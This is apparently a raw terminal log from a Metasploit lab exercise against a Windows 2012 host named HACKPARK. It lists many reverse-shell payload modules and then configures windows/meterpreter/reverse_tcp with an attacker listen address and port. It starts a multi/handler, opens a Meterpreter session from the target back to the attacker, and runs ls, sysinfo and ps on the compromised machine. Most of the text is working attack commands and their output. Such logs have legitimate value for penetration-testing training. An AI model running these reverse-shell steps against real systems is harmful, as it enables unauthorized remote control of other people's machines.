+   221  payload/python/meterpreter_reverse_https                                        normal     No     Python Meterpreter Shell, Reverse HTTPS Inline
+   222  payload/python/meterpreter_reverse_tcp                                          normal     No     Python Meterpreter Shell, Reverse TCP Inline
+   223  payload/python/pingback_reverse_tcp                                             normal     No     Python Pingback, Reverse TCP (via python)
+   224  payload/python/shell_reverse_tcp                                                normal     No     Command Shell, Reverse TCP (via python)
+   225  payload/python/shell_reverse_tcp_ssl                                            normal     No     Command Shell, Reverse TCP SSL (via python)
+   226  payload/python/shell_reverse_udp                                                normal     No     Command Shell, Reverse UDP (via python)
+   227  payload/r/shell_reverse_tcp                                                     normal     No     R Command Shell, Reverse TCP
+   228  payload/ruby/pingback_reverse_tcp                                               normal     No     Ruby Pingback, Reverse TCP
+   229  payload/ruby/shell_reverse_tcp                                                  normal     No     Ruby Command Shell, Reverse TCP
+   230  payload/ruby/shell_reverse_tcp_ssl                                              normal     No     Ruby Command Shell, Reverse TCP SSL
+   231  payload/solaris/sparc/shell_reverse_tcp                                         normal     No     Solaris Command Shell, Reverse TCP Inline
+   232  payload/solaris/x86/shell_reverse_tcp                                           normal     No     Solaris Command Shell, Reverse TCP Inline
+   233  payload/windows/dllinject/reverse_hop_http                                      normal     No     Reflective DLL Injection, Reverse Hop HTTP/HTTPS St
+ager
+   234  payload/windows/dllinject/reverse_http                                          normal     No     Reflective DLL Injection, Windows Reverse HTTP Stag
+er (wininet)
+   235  payload/windows/dllinject/reverse_http_proxy_pstore                             normal     No     Reflective DLL Injection, Reverse HTTP Stager Proxy
+   236  payload/windows/dllinject/reverse_ipv6_tcp                                      normal     No     Reflective DLL Injection, Reverse TCP Stager (IPv6)
+   237  payload/windows/dllinject/reverse_nonx_tcp                                      normal     No     Reflective DLL Injection, Reverse TCP Stager (No NX
+ or Win7)
+   238  payload/windows/dllinject/reverse_ord_tcp                                       normal     No     Reflective DLL Injection, Reverse Ordinal TCP Stage
+r (No NX or Win7)
+   239  payload/windows/dllinject/reverse_tcp                                           normal     No     Reflective DLL Injection, Reverse TCP Stager
+   240  payload/windows/dllinject/reverse_tcp_allports                                  normal     No     Reflective DLL Injection, Reverse All-Port TCP Stag
+er
+   241  payload/windows/dllinject/reverse_tcp_dns                                       normal     No     Reflective DLL Injection, Reverse TCP Stager (DNS)
+   242  payload/windows/dllinject/reverse_tcp_rc4                                       normal     No     Reflective DLL Injection, Reverse TCP Stager (RC4 S
+tage Encryption, Metasm)
+   243  payload/windows/dllinject/reverse_tcp_rc4_dns                                   normal     No     Reflective DLL Injection, Reverse TCP Stager (RC4 S
+tage Encryption DNS, Metasm)
+   244  payload/windows/dllinject/reverse_tcp_uuid                                      normal     No     Reflective DLL Injection, Reverse TCP Stager with U
+UID Support
+   245  payload/windows/dllinject/reverse_winhttp                                       normal     No     Reflective DLL Injection, Windows Reverse HTTP Stag
+er (winhttp)
+   246  payload/windows/meterpreter/reverse_hop_http                                    normal     No     Windows Meterpreter (Reflective Injection), Reverse
+ Hop HTTP/HTTPS Stager
+   247  payload/windows/meterpreter/reverse_http                                        normal     No     Windows Meterpreter (Reflective Injection), Windows
+ Reverse HTTP Stager (wininet)
+   248  payload/windows/meterpreter/reverse_http_proxy_pstore                           normal     No     Windows Meterpreter (Reflective Injection), Reverse
+ HTTP Stager Proxy
+   249  payload/windows/meterpreter/reverse_https                                       normal     No     Windows Meterpreter (Reflective Injection), Windows
+ Reverse HTTPS Stager (wininet)
+   250  payload/windows/meterpreter/reverse_https_proxy                                 normal     No     Windows Meterpreter (Reflective Injection), Reverse
+ HTTPS Stager with Support for Custom Proxy
+   251  payload/windows/meterpreter/reverse_ipv6_tcp                                    normal     No     Windows Meterpreter (Reflective Injection), Reverse
+ TCP Stager (IPv6)
+   252  payload/windows/meterpreter/reverse_named_pipe                                  normal     No     Windows Meterpreter (Reflective Injection), Windows
+ x86 Reverse Named Pipe (SMB) Stager
+   253  payload/windows/meterpreter/reverse_nonx_tcp                                    normal     No     Windows Meterpreter (Reflective Injection), Reverse
+ TCP Stager (No NX or Win7)
+   254  payload/windows/meterpreter/reverse_ord_tcp                                     normal     No     Windows Meterpreter (Reflective Injection), Reverse
+ Ordinal TCP Stager (No NX or Win7)
+   255  payload/windows/meterpreter/reverse_tcp                                         normal     No     Windows Meterpreter (Reflective Injection), Reverse
+ TCP Stager
+   256  payload/windows/meterpreter/reverse_tcp_allports                                normal     No     Windows Meterpreter (Reflective Injection), Reverse
+ All-Port TCP Stager
+   257  payload/windows/meterpreter/reverse_tcp_dns                                     normal     No     Windows Meterpreter (Reflective Injection), Reverse
+ TCP Stager (DNS)
+   258  payload/windows/meterpreter/reverse_tcp_rc4                                     normal     No     Windows Meterpreter (Reflective Injection), Reverse
+ TCP Stager (RC4 Stage Encryption, Metasm)
+   259  payload/windows/meterpreter/reverse_tcp_rc4_dns                                 normal     No     Windows Meterpreter (Reflective Injection), Reverse
+ TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   260  payload/windows/meterpreter/reverse_tcp_uuid                                    normal     No     Windows Meterpreter (Reflective Injection), Reverse
+ TCP Stager with UUID Support
+   261  payload/windows/meterpreter/reverse_winhttp                                     normal     No     Windows Meterpreter (Reflective Injection), Windows
+ Reverse HTTP Stager (winhttp)
+   262  payload/windows/meterpreter/reverse_winhttps                                    normal     No     Windows Meterpreter (Reflective Injection), Windows
+ Reverse HTTPS Stager (winhttp)
+   263  payload/windows/meterpreter_reverse_http                                        normal     No     Windows Meterpreter Shell, Reverse HTTP Inline
+   264  payload/windows/meterpreter_reverse_https                                       normal     No     Windows Meterpreter Shell, Reverse HTTPS Inline
+   265  payload/windows/meterpreter_reverse_ipv6_tcp                                    normal     No     Windows Meterpreter Shell, Reverse TCP Inline (IPv6
+)
+   266  payload/windows/meterpreter_reverse_tcp                                         normal     No     Windows Meterpreter Shell, Reverse TCP Inline
+   267  payload/windows/metsvc_reverse_tcp                                              normal     No     Windows Meterpreter Service, Reverse TCP Inline
+   268  payload/windows/patchupdllinject/reverse_ipv6_tcp                               normal     No     Windows Inject DLL, Reverse TCP Stager (IPv6)
+   269  payload/windows/patchupdllinject/reverse_nonx_tcp                               normal     No     Windows Inject DLL, Reverse TCP Stager (No NX or Wi
+n7)
+   270  payload/windows/patchupdllinject/reverse_ord_tcp                                normal     No     Windows Inject DLL, Reverse Ordinal TCP Stager (No
+NX or Win7)
+   271  payload/windows/patchupdllinject/reverse_tcp                                    normal     No     Windows Inject DLL, Reverse TCP Stager
+   272  payload/windows/patchupdllinject/reverse_tcp_allports                           normal     No     Windows Inject DLL, Reverse All-Port TCP Stager
+   273  payload/windows/patchupdllinject/reverse_tcp_dns                                normal     No     Windows Inject DLL, Reverse TCP Stager (DNS)
+   274  payload/windows/patchupdllinject/reverse_tcp_rc4                                normal     No     Windows Inject DLL, Reverse TCP Stager (RC4 Stage E
+ncryption, Metasm)
+   275  payload/windows/patchupdllinject/reverse_tcp_rc4_dns                            normal     No     Windows Inject DLL, Reverse TCP Stager (RC4 Stage E
+ncryption DNS, Metasm)
+   276  payload/windows/patchupdllinject/reverse_tcp_uuid                               normal     No     Windows Inject DLL, Reverse TCP Stager with UUID Su
+pport
+   277  payload/windows/patchupmeterpreter/reverse_ipv6_tcp                             normal     No     Windows Meterpreter (skape/jt Injection), Reverse T
+CP Stager (IPv6)
+   278  payload/windows/patchupmeterpreter/reverse_nonx_tcp                             normal     No     Windows Meterpreter (skape/jt Injection), Reverse T
+CP Stager (No NX or Win7)
+   279  payload/windows/patchupmeterpreter/reverse_ord_tcp                              normal     No     Windows Meterpreter (skape/jt Injection), Reverse O
+rdinal TCP Stager (No NX or Win7)
+   280  payload/windows/patchupmeterpreter/reverse_tcp                                  normal     No     Windows Meterpreter (skape/jt Injection), Reverse T
+CP Stager
+   281  payload/windows/patchupmeterpreter/reverse_tcp_allports                         normal     No     Windows Meterpreter (skape/jt Injection), Reverse A
+ll-Port TCP Stager
+   282  payload/windows/patchupmeterpreter/reverse_tcp_dns                              normal     No     Windows Meterpreter (skape/jt Injection), Reverse T
+CP Stager (DNS)
+   283  payload/windows/patchupmeterpreter/reverse_tcp_rc4                              normal     No     Windows Meterpreter (skape/jt Injection), Reverse T
+CP Stager (RC4 Stage Encryption, Metasm)
+   284  payload/windows/patchupmeterpreter/reverse_tcp_rc4_dns                          normal     No     Windows Meterpreter (skape/jt Injection), Reverse T
+CP Stager (RC4 Stage Encryption DNS, Metasm)
+   285  payload/windows/patchupmeterpreter/reverse_tcp_uuid                             normal     No     Windows Meterpreter (skape/jt Injection), Reverse T
+CP Stager with UUID Support
+   286  payload/windows/pingback_reverse_tcp                                            normal     No     Windows x86 Pingback, Reverse TCP Inline
+   287  payload/windows/powershell_reverse_tcp                                          normal     No     Windows Interactive Powershell Session, Reverse TCP
+   288  payload/windows/shell/reverse_ipv6_tcp                                          normal     No     Windows Command Shell, Reverse TCP Stager (IPv6)
+   289  payload/windows/shell/reverse_nonx_tcp                                          normal     No     Windows Command Shell, Reverse TCP Stager (No NX or
+ Win7)
+   290  payload/windows/shell/reverse_ord_tcp                                           normal     No     Windows Command Shell, Reverse Ordinal TCP Stager (
+No NX or Win7)
+   291  payload/windows/shell/reverse_tcp                                               normal     No     Windows Command Shell, Reverse TCP Stager
+   292  payload/windows/shell/reverse_tcp_allports                                      normal     No     Windows Command Shell, Reverse All-Port TCP Stager
+   293  payload/windows/shell/reverse_tcp_dns                                           normal     No     Windows Command Shell, Reverse TCP Stager (DNS)
+   294  payload/windows/shell/reverse_tcp_rc4                                           normal     No     Windows Command Shell, Reverse TCP Stager (RC4 Stag
+e Encryption, Metasm)
+   295  payload/windows/shell/reverse_tcp_rc4_dns                                       normal     No     Windows Command Shell, Reverse TCP Stager (RC4 Stag
+e Encryption DNS, Metasm)
+   296  payload/windows/shell/reverse_tcp_uuid                                          normal     No     Windows Command Shell, Reverse TCP Stager with UUID
+ Support
+   297  payload/windows/shell/reverse_udp                                               normal     No     Windows Command Shell, Reverse UDP Stager with UUID
+ Support
+   298  payload/windows/shell_reverse_tcp                                               normal     No     Windows Command Shell, Reverse TCP Inline
+   299  payload/windows/upexec/reverse_ipv6_tcp                                         normal     No     Windows Upload/Execute, Reverse TCP Stager (IPv6)
+   300  payload/windows/upexec/reverse_nonx_tcp                                         normal     No     Windows Upload/Execute, Reverse TCP Stager (No NX o
+r Win7)
+   301  payload/windows/upexec/reverse_ord_tcp                                          normal     No     Windows Upload/Execute, Reverse Ordinal TCP Stager
+(No NX or Win7)
+   302  payload/windows/upexec/reverse_tcp                                              normal     No     Windows Upload/Execute, Reverse TCP Stager
+   303  payload/windows/upexec/reverse_tcp_allports                                     normal     No     Windows Upload/Execute, Reverse All-Port TCP Stager
+   304  payload/windows/upexec/reverse_tcp_dns                                          normal     No     Windows Upload/Execute, Reverse TCP Stager (DNS)
+   305  payload/windows/upexec/reverse_tcp_rc4                                          normal     No     Windows Upload/Execute, Reverse TCP Stager (RC4 Sta
+ge Encryption, Metasm)
+   306  payload/windows/upexec/reverse_tcp_rc4_dns                                      normal     No     Windows Upload/Execute, Reverse TCP Stager (RC4 Sta
+ge Encryption DNS, Metasm)
+   307  payload/windows/upexec/reverse_tcp_uuid                                         normal     No     Windows Upload/Execute, Reverse TCP Stager with UUI
+D Support
+   308  payload/windows/upexec/reverse_udp                                              normal     No     Windows Upload/Execute, Reverse UDP Stager with UUI
+D Support
+   309  payload/windows/vncinject/reverse_hop_http                                      normal     No     VNC Server (Reflective Injection), Reverse Hop HTTP
+/HTTPS Stager
+   310  payload/windows/vncinject/reverse_http                                          normal     No     VNC Server (Reflective Injection), Windows Reverse
+HTTP Stager (wininet)
+   311  payload/windows/vncinject/reverse_http_proxy_pstore                             normal     No     VNC Server (Reflective Injection), Reverse HTTP Sta
+ger Proxy
+   312  payload/windows/vncinject/reverse_ipv6_tcp                                      normal     No     VNC Server (Reflective Injection), Reverse TCP Stag
+er (IPv6)
+   313  payload/windows/vncinject/reverse_nonx_tcp                                      normal     No     VNC Server (Reflective Injection), Reverse TCP Stag
+er (No NX or Win7)
+   314  payload/windows/vncinject/reverse_ord_tcp                                       normal     No     VNC Server (Reflective Injection), Reverse Ordinal
+TCP Stager (No NX or Win7)
+   315  payload/windows/vncinject/reverse_tcp                                           normal     No     VNC Server (Reflective Injection), Reverse TCP Stag
+er
+   316  payload/windows/vncinject/reverse_tcp_allports                                  normal     No     VNC Server (Reflective Injection), Reverse All-Port
+ TCP Stager
+   317  payload/windows/vncinject/reverse_tcp_dns                                       normal     No     VNC Server (Reflective Injection), Reverse TCP Stag
+er (DNS)
+   318  payload/windows/vncinject/reverse_tcp_rc4                                       normal     No     VNC Server (Reflective Injection), Reverse TCP Stag
+er (RC4 Stage Encryption, Metasm)
+   319  payload/windows/vncinject/reverse_tcp_rc4_dns                                   normal     No     VNC Server (Reflective Injection), Reverse TCP Stag
+er (RC4 Stage Encryption DNS, Metasm)
+   320  payload/windows/vncinject/reverse_tcp_uuid                                      normal     No     VNC Server (Reflective Injection), Reverse TCP Stag
+er with UUID Support
+   321  payload/windows/vncinject/reverse_winhttp                                       normal     No     VNC Server (Reflective Injection), Windows Reverse
+HTTP Stager (winhttp)
+   322  payload/windows/x64/meterpreter/reverse_http                                    normal     No     Windows Meterpreter (Reflective Injection x64), Win
+dows x64 Reverse HTTP Stager (wininet)
+   323  payload/windows/x64/meterpreter/reverse_https                                   normal     No     Windows Meterpreter (Reflective Injection x64), Win
+dows x64 Reverse HTTP Stager (wininet)
+   324  payload/windows/x64/meterpreter/reverse_named_pipe                              normal     No     Windows Meterpreter (Reflective Injection x64), Win
+dows x64 Reverse Named Pipe (SMB) Stager
+   325  payload/windows/x64/meterpreter/reverse_tcp                                     normal     No     Windows Meterpreter (Reflective Injection x64), Win
+dows x64 Reverse TCP Stager
+   326  payload/windows/x64/meterpreter/reverse_tcp_rc4                                 normal     No     Windows Meterpreter (Reflective Injection x64), Rev
+erse TCP Stager (RC4 Stage Encryption, Metasm)
+   327  payload/windows/x64/meterpreter/reverse_tcp_uuid                                normal     No     Windows Meterpreter (Reflective Injection x64), Rev
+erse TCP Stager with UUID Support (Windows x64)
+   328  payload/windows/x64/meterpreter/reverse_winhttp                                 normal     No     Windows Meterpreter (Reflective Injection x64), Win
+dows x64 Reverse HTTP Stager (winhttp)
+   329  payload/windows/x64/meterpreter/reverse_winhttps                                normal     No     Windows Meterpreter (Reflective Injection x64), Win
+dows x64 Reverse HTTPS Stager (winhttp)
+   330  payload/windows/x64/meterpreter_reverse_http                                    normal     No     Windows Meterpreter Shell, Reverse HTTP Inline (x64
+)
+   331  payload/windows/x64/meterpreter_reverse_https                                   normal     No     Windows Meterpreter Shell, Reverse HTTPS Inline (x6
+4)
+   332  payload/windows/x64/meterpreter_reverse_ipv6_tcp                                normal     No     Windows Meterpreter Shell, Reverse TCP Inline (IPv6
+) (x64)
+   333  payload/windows/x64/meterpreter_reverse_tcp                                     normal     No     Windows Meterpreter Shell, Reverse TCP Inline x64
+   334  payload/windows/x64/pingback_reverse_tcp                                        normal     No     Windows x64 Pingback, Reverse TCP Inline
+   335  payload/windows/x64/powershell_reverse_tcp                                      normal     No     Windows Interactive Powershell Session, Reverse TCP
+   336  payload/windows/x64/shell/reverse_tcp                                           normal     No     Windows x64 Command Shell, Windows x64 Reverse TCP
+Stager
+   337  payload/windows/x64/shell/reverse_tcp_rc4                                       normal     No     Windows x64 Command Shell, Reverse TCP Stager (RC4
+Stage Encryption, Metasm)
+   338  payload/windows/x64/shell/reverse_tcp_uuid                                      normal     No     Windows x64 Command Shell, Reverse TCP Stager with
+UUID Support (Windows x64)
+   339  payload/windows/x64/shell_reverse_tcp                                           normal     No     Windows x64 Command Shell, Reverse TCP Inline
+   340  payload/windows/x64/vncinject/reverse_http                                      normal     No     Windows x64 VNC Server (Reflective Injection), Wind
+ows x64 Reverse HTTP Stager (wininet)
+   341  payload/windows/x64/vncinject/reverse_https                                     normal     No     Windows x64 VNC Server (Reflective Injection), Wind
+ows x64 Reverse HTTP Stager (wininet)
+   342  payload/windows/x64/vncinject/reverse_tcp                                       normal     No     Windows x64 VNC Server (Reflective Injection), Wind
+ows x64 Reverse TCP Stager
+   343  payload/windows/x64/vncinject/reverse_tcp_rc4                                   normal     No     Windows x64 VNC Server (Reflective Injection), Reve
+rse TCP Stager (RC4 Stage Encryption, Metasm)
+   344  payload/windows/x64/vncinject/reverse_tcp_uuid                                  normal     No     Windows x64 VNC Server (Reflective Injection), Reve
+rse TCP Stager with UUID Support (Windows x64)
+   345  payload/windows/x64/vncinject/reverse_winhttp                                   normal     No     Windows x64 VNC Server (Reflective Injection), Wind
+ows x64 Reverse HTTP Stager (winhttp)
+   346  payload/windows/x64/vncinject/reverse_winhttps                                  normal     No     Windows x64 VNC Server (Reflective Injection), Wind
+ows x64 Reverse HTTPS Stager (winhttp)
+   347  post/multi/gather/dns_reverse_lookup                                            normal     No     Multi Gather DNS Reverse Lookup Scan
+   348  post/multi/manage/shell_to_meterpreter                                          normal     No     Shell to Meterpreter Upgrade
+   349  post/multi/manage/system_session                                                normal     No     Multi Manage System Remote TCP Shell Session
+   350  post/windows/escalate/ms10_073_kbdlayout                       2010-10-12       normal     No     Windows Escalate NtUserLoadKeyboardLayoutEx Privile
+ge Escalation
+   351  post/windows/gather/reverse_lookup                                              normal     No     Windows Gather IP Range Reverse Lookup
+   352  post/windows/recon/resolve_ip                                                   normal     No     Windows Recon Resolve IP
+
+
+Interact with a module by name or index, for example use 352 or use post/windows/recon/resolve_ip
+
+msf5 > use 255
+msf5 payload(windows/meterpreter/reverse_tcp) > options
+
+Module options (payload/windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+msf5 payload(windows/meterpreter/reverse_tcp) > use lhost 10.11.8.65
+
+Matching Modules
+================
+
+   #  Name                                              Disclosure Date  Rank       Check  Description
+   -  ----                                              ---------------  ----       -----  -----------
+   0  auxiliary/admin/http/kaseya_master_admin          2015-09-23       normal     No     Kaseya VSA Master Administrator Account Creation
+   1  exploit/linux/local/ueb_bpserverd_privesc         2018-03-14       excellent  No     Unitrends Enterprise Backup bpserverd Privilege Escalation
+   2  exploit/linux/misc/hplip_hpssd_exec               2007-10-04       excellent  No     HPLIP hpssd.py From Address Arbitrary Command Execution
+   3  exploit/multi/browser/msfd_rce_browser            2018-04-11       normal     No     Metasploit msfd Remote Code Execution via Browser
+   4  exploit/unix/webapp/kimai_sqli                    2013-05-21       average    Yes    Kimai v0.9.2 'db_restore.php' SQL Injection
+   5  exploit/windows/misc/hp_operations_agent_coda_34  2012-07-09       normal     Yes    HP Operations Agent Opcode coda.exe 0x34 Buffer Overflow
+   6  exploit/windows/misc/hp_operations_agent_coda_8c  2012-07-09       normal     Yes    HP Operations Agent Opcode coda.exe 0x8c Buffer Overflow
+
+
+Interact with a module by name or index, for example use 6 or use exploit/windows/misc/hp_operations_agent_coda_8c
+
+msf5 payload(windows/meterpreter/reverse_tcp) > set lhost 10.11.8.65
+
+lhost => 10.11.8.65
+msf5 payload(windows/meterpreter/reverse_tcp) > options
+
+Module options (payload/windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.11.8.65       yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+msf5 payload(windows/meterpreter/reverse_tcp) > set lport 5555
+lport => 5555
+msf5 payload(windows/meterpreter/reverse_tcp) > options
+
+Module options (payload/windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.11.8.65       yes       The listen address (an interface may be specified)
+   LPORT     5555             yes       The listen port
+
+msf5 payload(windows/meterpreter/reverse_tcp) > run
+[-] Unknown command: run.
+msf5 payload(windows/meterpreter/reverse_tcp) > help
+
+Core Commands
+=============
+
+    Command       Description
+    -------       -----------
+    ?             Help menu
+    banner        Display an awesome metasploit banner
+    cd            Change the current working directory
+    color         Toggle color
+    connect       Communicate with a host
+    debug         Display information useful for debugging
+    exit          Exit the console
+    get           Gets the value of a context-specific variable
+    getg          Gets the value of a global variable
+    grep          Grep the output of another command
+    help          Help menu
+    history       Show command history
+    load          Load a framework plugin
+    quit          Exit the console
+    repeat        Repeat a list of commands
+    route         Route traffic through a session
+    save          Saves the active datastores
+    sessions      Dump session listings and display information about sessions
+    set           Sets a context-specific variable to a value
+    setg          Sets a global variable to a value
+    sleep         Do nothing for the specified number of seconds
+    spool         Write console output into a file as well the screen
+    threads       View and manipulate background threads
+    tips          Show a list of useful productivity tips
+    unload        Unload a framework plugin
+    unset         Unsets one or more context-specific variables
+    unsetg        Unsets one or more global variables
+    version       Show the framework and console library version numbers
+
+
+Module Commands
+===============
+
+    Command       Description
+    -------       -----------
+    advanced      Displays advanced options for one or more modules
+    back          Move back from the current context
+    clearm        Clear the module stack
+    info          Displays information about one or more modules
+    listm         List the module stack
+    loadpath      Searches for and loads modules from a path
+    options       Displays global options or for one or more modules
+    popm          Pops the latest module off the stack and makes it active
+    previous      Sets the previously loaded module as the current module
+    pushm         Pushes the active or list of modules onto the module stack
+    reload_all    Reloads all modules from all defined module paths
+    search        Searches module names and descriptions
+    show          Displays modules of a given type, or all modules
+    use           Interact with a module by name or search term/index
+
+
+Job Commands
+============
+
+    Command       Description
+    -------       -----------
+    handler       Start a payload handler as job
+    jobs          Displays and manages jobs
+    kill          Kill a job
+    rename_job    Rename a job
+
+
+Resource Script Commands
+========================
+
+    Command       Description
+    -------       -----------
+    makerc        Save commands entered since start to a file
+    resource      Run the commands stored in a file
+
+
+Database Backend Commands
+=========================
+
+    Command           Description
+    -------           -----------
+    analyze           Analyze database information about a specific address or address range
+    db_connect        Connect to an existing data service
+    db_disconnect     Disconnect from the current data service
+    db_export         Export a file containing the contents of the database
+    db_import         Import a scan result file (filetype will be auto-detected)
+    db_nmap           Executes nmap and records the output automatically
+    db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
+    db_remove         Remove the saved data service entry
+    db_save           Save the current data service connection as the default to reconnect on startup
+    db_status         Show the current data service status
+    hosts             List all hosts in the database
+    loot              List all loot in the database
+    notes             List all notes in the database
+    services          List all services in the database
+    vulns             List all vulnerabilities in the database
+    workspace         Switch between database workspaces
+
+
+Credentials Backend Commands
+============================
+
+    Command       Description
+    -------       -----------
+    creds         List all credentials in the database
+
+
+Developer Commands
+==================
+
+    Command       Description
+    -------       -----------
+    edit          Edit the current module or a file with the preferred editor
+    irb           Open an interactive Ruby shell in the current context
+    log           Display framework.log paged to the end if possible
+    pry           Open the Pry debugger on the current module or Framework
+    reload_lib    Reload Ruby library files from specified paths
+
+
+Payload Commands
+================
+
+    Command       Description
+    -------       -----------
+    check         Check to see if a target is vulnerable
+    generate      Generates a payload
+    reload        Reload the current module from disk
+    to_handler    Creates a handler with the specified payload
+
+
+msfconsole
+==========
+
+`msfconsole` is the primary interface to Metasploit Framework. There is quite a
+lot that needs go here, please be patient and keep an eye on this space!
+
+Building ranges and lists
+-------------------------
+
+Many commands and options that take a list of things can use ranges to avoid
+having to manually list each desired thing. All ranges are inclusive.
+
+### Ranges of IDs
+
+Commands that take a list of IDs can use ranges to help. Individual IDs must be
+separated by a `,` (no space allowed) and ranges can be expressed with either
+`-` or `..`.
+
+### Ranges of IPs
+
+There are several ways to specify ranges of IP addresses that can be mixed
+together. The first way is a list of IPs separated by just a ` ` (ASCII space),
+with an optional `,`. The next way is two complete IP addresses in the form of
+`BEGINNING_ADDRESS-END_ADDRESS` like `127.0.1.44-127.0.2.33`. CIDR
+specifications may also be used, however the whole address must be given to
+Metasploit like `127.0.0.0/8` and not `127/8`, contrary to the RFC.
+Additionally, a netmask can be used in conjunction with a domain name to
+dynamically resolve which block to target. All these methods work for both IPv4
+and IPv6 addresses. IPv4 addresses can also be specified with special octet
+ranges from the [NMAP target
+specification](https://nmap.org/book/man-target-specification.html)
+
+### Examples
+
+Terminate the first sessions:
+
+    sessions -k 1
+
+Stop some extra running jobs:
+
+    jobs -k 2-6,7,8,11..15
+
+Check a set of IP addresses:
+
+    check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255
+
+Target a set of IPv6 hosts:
+
+    set RHOSTS fe80::3990:0000/110, ::1-::f0f0
+
+Target a block from a resolved domain name:
+
+    set RHOSTS www.example.test/24
+msf5 payload(windows/meterpreter/reverse_tcp) > info
+
+       Name: Windows Meterpreter (Reflective Injection), Reverse TCP Stager
+     Module: payload/windows/meterpreter/reverse_tcp
+   Platform: Windows
+       Arch: x86
+Needs Admin: No
+ Total size: 283
+       Rank: Normal
+
+Provided by:
+  skape <mmiller@hick.org>
+  sf <stephen_fewer@harmonysecurity.com>
+  OJ Reeves
+  hdm <x@hdm.io>
+
+Basic options:
+Name      Current Setting  Required  Description
+----      ---------------  --------  -----------
+EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+LHOST     10.11.8.65       yes       The listen address (an interface may be specified)
+LPORT     5555             yes       The listen port
+
+Description:
+  Inject the meterpreter server DLL via the Reflective Dll Injection
+  payload (staged). Connect back to the attacker
+
+
+msf5 payload(windows/meterpreter/reverse_tcp) > run
+[-] Unknown command: run.
+msf5 payload(windows/meterpreter/reverse_tcp) > exploit
+[-] Unknown command: exploit.
+msf5 payload(windows/meterpreter/reverse_tcp) > post
+[-] Unknown command: post.
+msf5 payload(windows/meterpreter/reverse_tcp) > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf5 exploit(multi/handler) > options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf5 exploit(multi/handler) > set lhost tun0
+lhost => 10.11.8.65
+msf5 exploit(multi/handler) > set lport 5555
+lport => 5555
+msf5 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.11.8.65:5555
+[*] Sending stage (176195 bytes) to 10.10.207.167
+[*] Meterpreter session 1 opened (10.11.8.65:5555 -> 10.10.207.167:49217) at 2020-08-07 07:04:30 +0200
+
+
+meterpreter >
+meterpreter > ls
+Listing: C:\Users\Public
+========================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+40555/r-xr-xr-x   0      dir   2013-08-22 17:39:30 +0200  Desktop
+40555/r-xr-xr-x   0      dir   2013-08-22 17:39:30 +0200  Documents
+40555/r-xr-xr-x   0      dir   2013-08-22 17:39:30 +0200  Downloads
+40555/r-xr-xr-x   0      dir   2013-08-22 17:39:30 +0200  Libraries
+40555/r-xr-xr-x   0      dir   2013-08-22 17:39:30 +0200  Music
+40555/r-xr-xr-x   0      dir   2013-08-22 17:39:30 +0200  Pictures
+40555/r-xr-xr-x   0      dir   2013-08-22 17:39:30 +0200  Videos
+100666/rw-rw-rw-  174    fil   2013-08-22 17:39:32 +0200  desktop.ini
+100777/rwxrwxrwx  73802  fil   2020-08-07 07:03:51 +0200  shell.exe
+
+meterpreter > sysinfo
+Computer        : HACKPARK
+OS              : Windows 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User              Path
+ ---   ----  ----                  ----  -------  ----              ----
+ 0     0     [System Process]
+ 4     0     System
+ 348   676   svchost.exe
+ 372   4     smss.exe
+ 532   520   csrss.exe
+ 584   576   csrss.exe
+ 592   520   wininit.exe
+ 624   576   winlogon.exe
+ 676   592   services.exe
+ 684   592   lsass.exe
+ 744   676   svchost.exe
+ 788   676   svchost.exe
+ 872   676   svchost.exe
+ 888   624   dwm.exe
+ 916   676   svchost.exe
+ 944   676   svchost.exe
+ 988   676   svchost.exe
+ 1132  676   spoolsv.exe
+ 1148  744   SppExtComObj.Exe
+ 1168  676   amazon-ssm-agent.exe
+ 1212  676   vds.exe
+ 1220  2644  ServerManager.exe
+ 1248  676   svchost.exe
+ 1276  676   LiteAgent.exe
+ 1332  676   svchost.exe
+ 1348  676   svchost.exe
+ 1380  676   WService.exe
+ 1552  676   wlms.exe
+ 1560  1380  WScheduler.exe
+ 1576  676   Ec2Config.exe
+ 1584  1736  cmd.exe               x64   0        IIS APPPOOL\Blog  C:\Windows\System32\cmd.exe
+ 1736  1348  w3wp.exe              x64   0        IIS APPPOOL\Blog  C:\Windows\System32\inetsrv\w3wp.exe
+ 1868  676   svchost.exe
